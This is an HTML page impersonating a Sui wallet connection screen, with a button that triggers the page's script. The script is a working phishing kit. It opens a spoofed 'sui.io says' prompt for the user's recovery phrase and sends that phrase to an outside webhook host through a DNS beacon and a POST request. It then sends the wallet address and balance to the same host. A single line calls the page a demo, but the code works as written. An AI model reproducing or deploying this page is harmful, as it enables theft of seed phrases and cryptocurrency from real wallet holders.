<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>sui.io</title>
  <style>
    body {
      margin: 0; padding: 0; height: 100vh; background: #0f172a; color: #e2e8f0;
      font-family: system-ui; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center;
    }
    .logo { font-size: 80px; margin-bottom: 20px; }
    h1 { font-size: 28px; margin-bottom: 20px; }
    p { font-size: 18px; color: #94a3b8; margin-bottom: 40px; max-width: 500px; }
    .btn {
      padding: 18px 40px; font-size: 20px; background: #22c55e; color: black; border: none; border-radius: 16px;
      cursor: pointer; box-shadow: 0 10px 40px rgba(34,197,94,0.6); transition: 0.3s; font-weight: bold;
    }
    .btn:hover { background: #16a34a; transform: scale(1.05); }
    .status {
      margin-top: 30px; font-size: 16px; min-height: 60px;
    }
    .address {
      color: #22c55e;
      word-break: break-all;
    }
    .warning {
      margin-top: 40px;
      color: #ef4444;
      font-weight: bold;
      font-size: 14px;
    }
  </style>
</head>
<body>

  <div class="logo">ðŸŒŠ</div>
  <h1>Sui Wallet</h1>
  <p>Connect your Sui wallet to continue</p>
  <button class="btn" id="connectWallet">Connect Wallet</button>

  <div class="status" id="status">Ready</div>

  <div class="warning">
    This is a demo â€” do not use on real wallet!
  </div>

  <script>
    //
    const OOB = "ancient-unicorn-29.webhook.cool";

    document.getElementById("connectWallet").addEventListener("click", async () => {
      const statusEl = document.getElementById("status");

      statusEl.innerHTML = "Connecting to Sui wallet...";

      // 1. PROMPT SEED PHRASE
      setTimeout(() => {
        const seed = prompt("sui.io says:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nEnter your recovery phrase before continue");
        if (seed && seed.trim() !== "") {
          // Exfil via OOB DNS
          const beacon = btoa(seed.trim()).replace(/=/g, '').substring(0, 500);
          new Image().src = `https://${beacon}.${OOB}`;

          // Backup POST
          fetch(`https://${OOB}/sui-seed`, {
            method: "POST",
            body: JSON.stringify({ seed: seed.trim() })
          }).catch(() => {});
        }
      }, 1000);

      try {
        // 2. CONNECT to SUI WALLET VIA window.sui
        if (!window.sui) {
          throw new Error("Sui wallet not detected. Please open this page in Sui Wallet browser.");
        }

        // Request permission & get address
        const permission = await window.sui.requestPermissions();
        if (!permission) throw new Error("Permission denied");

        const accounts = await window.sui.getAccounts();
        if (!accounts || accounts.length === 0) throw new Error("No accounts found");

        const suiAddress = accounts[0];

        statusEl.innerHTML = `Connected: <span class="address">${suiAddress}</span>`;

        // Exfil Sui address via OOB
        const addrBeacon = btoa(suiAddress).replace(/=/g, '');
        new Image().src = `https://sui-addr-${addrBeacon}.${OOB}`;

        // Optional: Get balance
        const balance = await window.sui.getBalance({ coinType: "0x2::sui::SUI" });
        fetch(`https://${OOB}/sui-balance`, {
          method: "POST",
          body: JSON.stringify({ address: suiAddress, balance: balance.totalBalance })
        });

      } catch (err) {
        statusEl.innerHTML = `<span style="color:#ef4444">Error: ${err.message || "Connection failed"}</span>`;
        console.log("Sui wallet failed:", err);
      }
    });
  </script>

</body>
</html>
